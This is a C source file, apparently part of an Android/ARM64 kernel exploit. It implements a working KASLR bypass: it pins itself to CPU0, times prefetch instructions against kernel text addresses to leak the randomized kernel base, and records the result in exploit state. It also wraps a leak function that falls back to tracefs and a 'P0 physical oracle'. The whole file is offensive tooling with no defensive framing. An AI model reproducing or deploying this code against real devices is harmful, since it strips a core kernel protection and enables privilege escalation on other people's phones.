#include "common.h"

#if defined(APP_CPU0_KASLR_SLIDE) && APP_CPU0_KASLR_SLIDE

/*
 * CPU0 KASLR resolver.
 *
 * This follows the working Android/ARM64 prefetch-channel approach used by
 * the A536 production target, but is kept isolated from the existing slide
 * implementation so tracefs and the P0 physical oracle remain untouched as
 * fallbacks.
 */
#ifndef APP_CPU0_PREFETCH_MAX_OFFSET
#define APP_CPU0_PREFETCH_MAX_OFFSET 0x1f0000ULL
#endif
#ifndef APP_CPU0_PREFETCH_SCAN_STEP
#define APP_CPU0_PREFETCH_SCAN_STEP 0x8000ULL
#endif
#ifndef APP_CPU0_PREFETCH_SAMPLES
#define APP_CPU0_PREFETCH_SAMPLES 32
#endif
#ifndef APP_CPU0_PREFETCH_BURST
#define APP_CPU0_PREFETCH_BURST 512
#endif
#ifndef APP_CPU0_PREFETCH_EDGE_RUN
#define APP_CPU0_PREFETCH_EDGE_RUN 8
#endif
#ifndef APP_CPU0_PREFETCH_REPEATS
#define APP_CPU0_PREFETCH_REPEATS 3
#endif

#define CPU0_PREFETCH_INVALID UINT64_MAX

static inline uint64_t cpu0_read_cntvct(void) {
  uint64_t value;
  __asm__ volatile("isb\n\tmrs %0, cntvct_el0\n\tisb"
                   : "=r"(value) :: "memory");
  return value;
}

static uint64_t cpu0_measure_prefetch(uintptr_t address) {
  __asm__ volatile("dsb sy\n\tisb" ::: "memory");
  uint64_t started = cpu0_read_cntvct();
  for (int index = 0; index < APP_CPU0_PREFETCH_BURST; index++) {
    __asm__ volatile("prfm plil1keep, [%0]" : : "r"(address) : "memory");
  }
  __asm__ volatile("dsb sy\n\tisb" ::: "memory");
  return cpu0_read_cntvct() - started;
}

static int cpu0_compare_u64(const void *left, const void *right) {
  uint64_t a = *(const uint64_t *)left;
  uint64_t b = *(const uint64_t *)right;
  return (a > b) - (a < b);
}

static uint64_t cpu0_quantile(uintptr_t address) {
  uint64_t samples[APP_CPU0_PREFETCH_SAMPLES];
  for (size_t index = 0; index < APP_CPU0_PREFETCH_SAMPLES; index++) {
    samples[index] = cpu0_measure_prefetch(address);
  }
  qsort(samples, APP_CPU0_PREFETCH_SAMPLES, sizeof(samples[0]),
        cpu0_compare_u64);
  return samples[APP_CPU0_PREFETCH_SAMPLES / 8];
}

static int cpu0_control_ok(uint64_t mapped, uint64_t unmapped) {
  if (unmapped <= mapped || unmapped - mapped < 8) {
    return 0;
  }
  return unmapped - mapped >= mapped / 2;
}

static void cpu0_measure_triplet(uintptr_t candidate,
                                 uintptr_t mapped,
                                 uintptr_t unmapped,
                                 uint64_t *candidate_q,
                                 uint64_t *mapped_q,
                                 uint64_t *unmapped_q) {
  uint64_t candidate_samples[APP_CPU0_PREFETCH_SAMPLES];
  uint64_t mapped_samples[APP_CPU0_PREFETCH_SAMPLES];
  uint64_t unmapped_samples[APP_CPU0_PREFETCH_SAMPLES];

  for (size_t index = 0; index < APP_CPU0_PREFETCH_SAMPLES; index++) {
    candidate_samples[index] = cpu0_measure_prefetch(candidate);
    mapped_samples[index] = cpu0_measure_prefetch(mapped);
    unmapped_samples[index] = cpu0_measure_prefetch(unmapped);
  }

  qsort(candidate_samples, APP_CPU0_PREFETCH_SAMPLES,
        sizeof(candidate_samples[0]), cpu0_compare_u64);
  qsort(mapped_samples, APP_CPU0_PREFETCH_SAMPLES,
        sizeof(mapped_samples[0]), cpu0_compare_u64);
  qsort(unmapped_samples, APP_CPU0_PREFETCH_SAMPLES,
        sizeof(unmapped_samples[0]), cpu0_compare_u64);

  *candidate_q = candidate_samples[APP_CPU0_PREFETCH_SAMPLES / 8];
  *mapped_q = mapped_samples[APP_CPU0_PREFETCH_SAMPLES / 8];
  *unmapped_q = unmapped_samples[APP_CPU0_PREFETCH_SAMPLES / 8];
}

static uint64_t cpu0_find_slide_once(void) {
  uintptr_t mapped_address = (uintptr_t)&cpu0_measure_prefetch;
  unsigned char *unmapped = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (unmapped == MAP_FAILED) {
    pr_warning("slide cpu0 prefetch mmap failed errno=%d\n", errno);
    return CPU0_PREFETCH_INVALID;
  }

  uintptr_t unmapped_address = (uintptr_t)unmapped;
  if (munmap(unmapped, PAGE_SIZE) != 0) {
    pr_warning("slide cpu0 prefetch munmap failed errno=%d\n", errno);
    return CPU0_PREFETCH_INVALID;
  }

  uint64_t mapped_q = cpu0_quantile(mapped_address);
  uint64_t unmapped_q = cpu0_quantile(unmapped_address);
  if (!cpu0_control_ok(mapped_q, unmapped_q)) {
    pr_warning("slide cpu0 prefetch controls rejected mapped=%llu unmapped=%llu\n",
               (unsigned long long)mapped_q,
               (unsigned long long)unmapped_q);
    return CPU0_PREFETCH_INVALID;
  }

  uint64_t edge = CPU0_PREFETCH_INVALID;
  unsigned high_run = 0;
  unsigned low_run = 0;

  for (uint64_t offset = 0;
       offset <= APP_CPU0_PREFETCH_MAX_OFFSET;
       offset += APP_CPU0_PREFETCH_SCAN_STEP) {
    uint64_t candidate_q;
    uint64_t local_mapped;
    uint64_t local_unmapped;
    cpu0_measure_triplet(KIMAGE_TEXT_BASE + offset,
                         mapped_address,
                         unmapped_address,
                         &candidate_q,
                         &local_mapped,
                         &local_unmapped);

    if (!cpu0_control_ok(local_mapped, local_unmapped)) {
      high_run = 0;
      low_run = 0;
      continue;
    }

    uint64_t threshold =
        local_mapped + (local_unmapped - local_mapped) / 2;
    if (candidate_q > threshold) {
      low_run = 0;
      if (high_run < APP_CPU0_PREFETCH_EDGE_RUN) {
        high_run++;
      }
    } else if (high_run >= APP_CPU0_PREFETCH_EDGE_RUN) {
      if (!low_run) {
        edge = offset;
      }
      low_run++;
      if (low_run >= APP_CPU0_PREFETCH_EDGE_RUN) {
        break;
      }
    } else {
      high_run = 0;
    }

    if (offset > APP_CPU0_PREFETCH_MAX_OFFSET -
                    APP_CPU0_PREFETCH_SCAN_STEP) {
      break;
    }
  }

  return edge;
}

static uint64_t cpu0_find_slide(void) {
  cpu_set_t original_set;
  cpu_set_t cpu0_set;
  uint64_t values[APP_CPU0_PREFETCH_REPEATS];
  unsigned successful = 0;
  unsigned best_count = 0;
  uint64_t best = CPU0_PREFETCH_INVALID;
  int result = 0;

  if (sched_getaffinity(0, sizeof(original_set), &original_set) != 0) {
    pr_warning("slide cpu0 prefetch getaffinity failed errno=%d\n", errno);
    return CPU0_PREFETCH_INVALID;
  }

  CPU_ZERO(&cpu0_set);
  CPU_SET(0, &cpu0_set);
  if (sched_setaffinity(0, sizeof(cpu0_set), &cpu0_set) != 0) {
    pr_warning("slide cpu0 prefetch setaffinity failed errno=%d\n", errno);
    return CPU0_PREFETCH_INVALID;
  }

  for (unsigned repeat = 0; repeat < APP_CPU0_PREFETCH_REPEATS; repeat++) {
    values[repeat] = cpu0_find_slide_once();
    if (values[repeat] == CPU0_PREFETCH_INVALID) {
      continue;
    }
    successful++;
    unsigned count = 0;
    for (unsigned prior = 0; prior <= repeat; prior++) {
      if (values[prior] == values[repeat]) {
        count++;
      }
    }
    if (count > best_count) {
      best_count = count;
      best = values[repeat];
    }
    pr_info("slide cpu0 prefetch repeat=%u/%u candidate=%08llx votes=%u\n",
            repeat + 1, APP_CPU0_PREFETCH_REPEATS,
            (unsigned long long)values[repeat], count);
  }

  int saved_errno = errno;
  if (sched_setaffinity(0, sizeof(original_set), &original_set) != 0) {
    pr_warning("slide cpu0 prefetch restore affinity failed errno=%d\n",
               errno);
    return CPU0_PREFETCH_INVALID;
  }
  errno = saved_errno;

  if (successful < 2 || best == CPU0_PREFETCH_INVALID ||
      best_count * 2 <= successful) {
    pr_warning("slide cpu0 prefetch no consensus successful=%u best_votes=%u\n",
               successful, best_count);
    return CPU0_PREFETCH_INVALID;
  }

  pr_success("slide cpu0 prefetch consensus slide=%08llx votes=%u/%u "
             "step=%08llx max=%08llx\n",
             (unsigned long long)best,
             best_count,
             successful,
             (unsigned long long)APP_CPU0_PREFETCH_SCAN_STEP,
             (unsigned long long)APP_CPU0_PREFETCH_MAX_OFFSET);
  result = 1;
  return result ? best : CPU0_PREFETCH_INVALID;
}

static int cpu0_commit_slide(uint64_t slide) {
  if (slide > APP_CPU0_PREFETCH_MAX_OFFSET ||
      (slide & 0x7fffULL) != 0 ||
      KIMAGE_TEXT_BASE > UINT64_MAX - slide) {
    pr_warning("slide cpu0 candidate rejected slide=%016llx\n",
               (unsigned long long)slide);
    return 0;
  }

  kaslr_base = KIMAGE_TEXT_BASE + slide;
  kaslr_slide = slide;
  slide_p0_offset = (uintptr_t)slide;
  kaslr_done = 1;
  data_addr_canonical = 1;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  /* CPU0 is a current-process direct KASLR discovery, not a stale cached P0. */
  slide_p0_session_fresh = 1;
#endif
  app_publish_slide_ready();
  pr_success("slide-kaslr-ok source=cpu0 pid=%d base=%016llx "
             "slide=%016llx data_mode=canonical\n",
             getpid(),
             (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide);
  return 1;
}

#endif

#if defined(APP_CPU0_KASLR_SLIDE) && APP_CPU0_KASLR_SLIDE
extern int __real_slide_leak_kernel_base(void);

int __wrap_slide_leak_kernel_base(void) {
  const char *forced_offset = getenv("SLIDE_P0_OFFSET");
  const char *source = getenv("SLIDE_SOURCE");

  /* Explicit legacy sources and a forced P0 offset retain their old meaning. */
  if ((forced_offset && *forced_offset) ||
      (source && strcmp(source, "tracefs") == 0) ||
      (source && strcmp(source, "p0") == 0)) {
    return __real_slide_leak_kernel_base();
  }

  if (source && *source &&
      strcmp(source, "auto") != 0 &&
      strcmp(source, "cpu0") != 0) {
    return __real_slide_leak_kernel_base();
  }

  pr_info("slide source priority=cpu0->tracefs->physical\n");
  uint64_t slide = cpu0_find_slide();
  if (slide != CPU0_PREFETCH_INVALID && cpu0_commit_slide(slide)) {
    return 1;
  }

  if (source && strcmp(source, "cpu0") == 0) {
    pr_error("slide cpu0 forced source failed\n");
    return 0;
  }

  pr_warning("slide cpu0 unavailable; trying legacy tracefs->physical path\n");
  return __real_slide_leak_kernel_base();
}
#endif
